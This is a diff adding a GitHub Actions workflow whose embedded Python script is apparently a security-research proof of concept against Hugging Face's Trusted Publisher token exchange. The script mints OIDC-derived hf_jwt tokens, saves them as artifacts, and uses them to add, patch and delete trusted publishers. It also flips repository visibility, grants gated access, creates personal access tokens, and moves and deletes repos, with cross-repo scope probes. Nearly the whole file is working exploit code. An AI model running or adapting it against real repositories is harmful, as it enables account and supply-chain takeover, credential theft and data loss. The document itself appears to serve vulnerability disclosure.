@@ -1,0 +1,249 @@
+name: i851 probe
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: leftover-TP repo (ns/name)
+        required: true
+        type: string
+      sac:
+        description: disposable TP repo (ns/name)
+        required: true
+        type: string
+      other:
+        description: other repo for scope tests
+        required: false
+        type: string
+        default: ""
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: run probe
+        env:
+          TARGET: ${{ inputs.target }}
+          SAC: ${{ inputs.sac }}
+          OTHER: ${{ inputs.other }}
+          ART_DIR: artifact
+        run: |
+          # -*- coding: utf-8 -*-
+          # i851: privilege ceiling of a Trusted-Publisher-minted hf_jwt_ (runs inside GitHub Actions where the OIDC id_token is minted)
+          import json, os, sys, base64, hashlib, urllib.request, urllib.error
+
+          BASE = "https://huggingface.co"
+          TARGET = os.environ["TARGET"]          # repo whose leftover publisher was enrolled by revoked user B
+          SAC = os.environ["SAC"]                # disposable repo whose publisher was enrolled by owner A
+          OTHER = os.environ.get("OTHER", "")    # extra repo for cross-scope tests
+          ART = os.environ.get("ART_DIR", "artifact")
+          os.makedirs(ART, exist_ok=True)
+
+          def req(method, path, token=None, cookie=None, body=None, ctype="application/json", extra=None, timeout=45):
+              h = {"User-Agent": "i851-probe/1.0", "Accept": "application/json"}
+              if token:  h["Authorization"] = "Bearer " + token
+              if cookie: h["Cookie"] = "token=" + cookie
+              data = None
+              if body is not None:
+                  if isinstance(body, (dict, list)):
+                      data = json.dumps(body).encode(); h["Content-Type"] = ctype
+                  elif isinstance(body, bytes):
+                      data = body; h["Content-Type"] = ctype
+                  else:
+                      data = str(body).encode(); h["Content-Type"] = ctype
+              if extra: h.update(extra)
+              r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
+              try:
+                  resp = urllib.request.urlopen(r, timeout=timeout)
+                  return resp.status, resp.read().decode("utf-8", "replace")
+              except urllib.error.HTTPError as e:
+                  return e.code, e.read().decode("utf-8", "replace")
+              except Exception as e:
+                  return None, repr(e)
+
+          def log(tag, st, b, n=600):
+              print("RESULT[%s] status=%s body=%s" % (tag, st, (b or "")[:n].replace("\n", " ")))
+              return st, b
+
+          def decode(t):
+              p = t.split(".")[1]; p += "=" * (-len(p) % 4)
+              return json.loads(base64.urlsafe_b64decode(p))
+
+          # ---------- OIDC identity (the removed collaborator's identity) ----------
+          u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=https%3A%2F%2Fhuggingface.co"
+          rq = urllib.request.Request(u, headers={"Authorization": "bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
+          idtok = json.loads(urllib.request.urlopen(rq).read())["value"]
+          print("OIDC_CLAIMS=" + json.dumps(decode(idtok), sort_keys=True))
+
+          def exchange(resource):
+              body = {"grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
+                      "subject_token_type": "urn:ietf:params:oauth:token-type:id_token",
+                      "subject_token": idtok}
+              if resource is not None:
+                  body["resource"] = resource
+              st, b = req("POST", "/oauth/token", body=body)
+              try:
+                  j = json.loads(b)
+              except Exception:
+                  j = {}
+              return st, j, b
+
+          tokens = {}
+          for name, res in [("target", TARGET), ("sac", SAC), ("namespace", TARGET.split("/")[0]),
+                            ("empty", ""), ("star", "*")]:
+              st, j, b = exchange(res)
+              at = j.get("access_token")
+              print("EXCHANGE[%s] resource=%r status=%s token_len=%s body=%s" % (name, res, st, len(at or ""), b[:300]))
+              if at:
+                  cl = decode(at)
+                  print("MINTED_CLAIMS[%s]=" % name + json.dumps(cl, sort_keys=True))
+                  tokens[name] = at
+                  with open(os.path.join(ART, "token_%s.txt" % name), "w") as f:
+                      f.write(at)
+          with open(os.path.join(ART, "claims.json"), "w") as f:
+              json.dump({k: decode(v) for k, v in tokens.items()}, f, indent=2)
+
+          tok = tokens.get("target")
+          if not tok:
+              print("NO_TARGET_TOKEN - aborting battery")
+              sys.exit(1)
+          open(os.path.join(ART, "hf_jwt_target.txt"), "w").write(tok)
+
+          # ---------- battery ----------
+          def tp_add(rp, token, value):
+              return req("POST", "/api/models/%s/settings/trusted-publishers" % rp, token=token,
+                         body={"issuerUrl": "https://token.actions.githubusercontent.com",
+                               "claims": {"repository": {"kind": "eq", "value": value}}})
+
+          def battery(label, token, rp, destructive=False):
+              ns, rn = rp.split("/")
+              print("===== BATTERY %s token_len=%s repo=%s destructive=%s =====" % (label, len(token), rp, destructive))
+              log(label + ":whoami_bearer", *req("GET", "/api/whoami-v2", token=token))
+              log(label + ":whoami_cookie", *req("GET", "/api/whoami-v2", cookie=token))
+              log(label + ":repo_meta", *req("GET", "/api/models/%s" % rp, token=token))
+              log(label + ":repo_tree", *req("GET", "/api/models/%s/tree/main" % rp, token=token))
+              log(label + ":repo_resolve", *req("GET", "/api/models/%s/resolve/main/.gitattributes" % rp, token=token))
+              log(label + ":settings_get", *req("GET", "/api/models/%s/settings" % rp, token=token))
+              log(label + ":settings_get_cookie", *req("GET", "/api/models/%s/settings" % rp, cookie=token))
+              log(label + ":tp_list", *req("GET", "/api/models/%s/settings/trusted-publishers" % rp, token=token))
+              log(label + ":tp_list_cookie", *req("GET", "/api/models/%s/settings/trusted-publishers" % rp, cookie=token))
+              # add a publisher with the SAME attacker OIDC claims as the leftover publisher
+              st, b = tp_add(rp, token, "BedheadProgrammer/bedhead-publisher-canary")
+              log(label + ":tp_add_same_claims", st, b)
+              newids = []
+              try:
+                  j = json.loads(b)
+                  if isinstance(j, dict) and j.get("_id"):
+                      newids.append(j["_id"])
+              except Exception:
+                  pass
+              # a second, different-issuer publisher (also proves add is not claim-locked)
+              st2, b2 = req("POST", "/api/models/%s/settings/trusted-publishers" % rp, token=token,
+                            body={"issuerUrl": "https://gitlab.com", "claims": {"sub": {"kind": "eq", "value": "i851-probe"}}})
+              log(label + ":tp_add_gitlab", st2, b2)
+              try:
+                  j = json.loads(b2)
+                  if isinstance(j, dict) and j.get("_id"):
+                      newids.append(j["_id"])
+              except Exception:
+                  pass
+              # modify one of the publishers this token just created (PATCH), then re-verify
+              if newids:
+                  nid = newids[0]
+                  log(label + ":tp_patch_created", *req("PATCH", "/api/models/%s/settings/trusted-publishers/%s" % (rp, nid),
+                                                       token=token, body={"claims": {"repository": {"kind": "eq", "value": "BedheadProgrammer/bedhead-publisher-canary"}}}))
+                  log(label + ":tp_after_patch", *req("GET", "/api/models/%s/settings/trusted-publishers" % rp, token=token))
+              # settings write plane (idempotent private=true; no state change)
+              log(label + ":settings_patch_private_true", *req("PATCH", "/api/models/%s/settings" % rp, token=token, body={"private": True}))
+              log(label + ":settings_put_private_true", *req("PUT", "/api/models/%s/settings" % rp, token=token, body={"private": True}))
+              # gated-access / grant management (granting the owner to himself is a no-op if accepted)
+              log(label + ":grant_owner_noop", *req("POST", "/api/models/%s/user-access-request/grant" % rp, token=token,
+                                                    body={"user": "h1testrightmeow"}))
+              log(label + ":user_access_request_get", *req("GET", "/api/models/%s/user-access-request" % rp, token=token))
+              # write-token / upload primitives
+              log(label + ":xet_write_token", *req("POST", "/api/models/%s/xet-write-token" % rp, token=token, body={}))
+              oid = hashlib.sha256(("i851-lfs-" + label).encode()).hexdigest()
+              log(label + ":lfs_batch_upload", *req("POST", "/api/models/%s.git/info/lfs/objects/batch" % rp, token=token,
+                                                    body={"operation": "upload", "transfers": ["basic"],
+                                                          "objects": [{"oid": oid, "size": 16}]}))
+              log(label + ":jwt_mint", *req("GET", "/api/models/%s/jwt" % rp, token=token))
+              log(label + ":tag_create", *req("POST", "/api/models/%s/tag/main" % rp, token=token,
+                                              body={"tag": "i851-" + label, "message": "i851"}))
+              # account-level credential plane
+              log(label + ":tokens_list", *req("GET", "/api/settings/tokens", token=token))
+              log(label + ":pat_create_form", *req("POST", "/api/settings/tokens", token=token,
+                                                   body="role=write&displayName=i851-%s" % label,
+                                                   ctype="application/x-www-form-urlencoded",
+                                                   extra={"Origin": "https://huggingface.co"}))
+              log(label + ":repos_create", *req("POST", "/api/repos/create", token=token,
+                                                body={"type": "model", "name": "i851-token-probe-" + label, "private": True}))
+              log(label + ":org_members", *req("GET", "/api/organizations/h1trm-oauth-none-20261107/members", token=token))
+              if destructive:
+                  # grant B access (real mutation on the disposable repo)
+                  log(label + ":grant_B", *req("POST", "/api/models/%s/user-access-request/grant" % rp, token=token,
+                                               body={"user": "h1testmeowmeowmeow"}))
+                  # DELETE the owner-configured publisher, then re-add -> self-heal after owner deletion
+                  tplist = req("GET", "/api/models/%s/settings/trusted-publishers" % rp, token=token)[1]
+                  try:
+                      arr = json.loads(tplist)
+                  except Exception:
+                      arr = []
+                  owner_tp = None
+                  for e in (arr or []):
+                      if isinstance(e, dict) and e.get("_id"):
+                          cb = (e.get("configuredBy") or {}).get("name")
+                          if cb == "h1testrightmeow":
+                              owner_tp = e["_id"]; break
+                  log(label + ":tp_list_before_delete", 200, tplist)
+                  if owner_tp:
+                      log(label + ":tp_delete_owner", *req("DELETE", "/api/models/%s/settings/trusted-publishers/%s" % (rp, owner_tp), token=token))
+                      log(label + ":tp_list_after_delete", *req("GET", "/api/models/%s/settings/trusted-publishers" % rp, token=token))
+                      log(label + ":tp_readd_after_delete", *tp_add(rp, token, "BedheadProgrammer/bedhead-publisher-canary"))
+                  # visibility flip (real change on disposable repo)
+                  log(label + ":settings_patch_public", *req("PATCH", "/api/models/%s/settings" % rp, token=token, body={"private": False}))
+                  log(label + ":settings_patch_private_again", *req("PATCH", "/api/models/%s/settings" % rp, token=token, body={"private": True}))
+                  # move (reversible-ish) then delete the disposable repo
+                  moved = "h1testrightmeow/" + rn + "-moved"
+                  stm, bm = req("POST", "/api/repos/move", token=token, body={"fromRepo": rp, "toRepo": moved, "type": "model"})
+                  log(label + ":repo_move", stm, bm)
+                  cur = moved if stm == 200 else rp
+                  log(label + ":repo_delete", *req("DELETE", "/api/models/%s" % cur, token=token))
+              return newids
+
+          # ---------- main flows ----------
+          new_target = battery("target", tok, TARGET, destructive=False)
+          # if the leftover-publisher token can enroll, additionally test that it can delete the OWNER/leftover publisher
+          # and keep a token-created publisher in place for a second, independent mint+exchange round.
+          if new_target:
+              tplist = req("GET", "/api/models/%s/settings/trusted-publishers" % TARGET, token=tok)[1]
+              try:
+                  arr = json.loads(tplist)
+              except Exception:
+                  arr = []
+              for e in (arr or []):
+                  if isinstance(e, dict) and e.get("_id") and e["_id"] not in new_target:
+                      log("target:tp_delete_previously_configured",
+                          *req("DELETE", "/api/models/%s/settings/trusted-publishers/%s" % (TARGET, e["_id"]), token=tok))
+              log("target:tp_list_final", *req("GET", "/api/models/%s/settings/trusted-publishers" % TARGET, token=tok))
+
+          if "sac" in tokens:
+              battery("sac", tokens["sac"], SAC, destructive=True)
+
+          # cross-repo scope enforcement: target token against the other repos
+          if tok:
+              log("scope:target_token_tp_list_on_sac", *req("GET", "/api/models/%s/settings/trusted-publishers" % SAC, token=tok))
+              log("scope:target_token_tp_add_on_sac", *tp_add(SAC, tok, "BedheadProgrammer/bedhead-publisher-canary"))
+              log("scope:target_token_settings_on_sac", *req("GET", "/api/models/%s/settings" % SAC, token=tok))
+              log("scope:target_token_hf_org", *req("GET", "/api/models/huggingface/CodeBERTa-small-v1/settings/trusted-publishers", token=tok))
+              if OTHER:
+                  log("scope:target_token_other_repo", *req("GET", "/api/models/%s/settings" % OTHER, token=tok))
+
+          print("PROBE_DONE")
+
+      - name: upload results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i851-results
+          path: artifact/
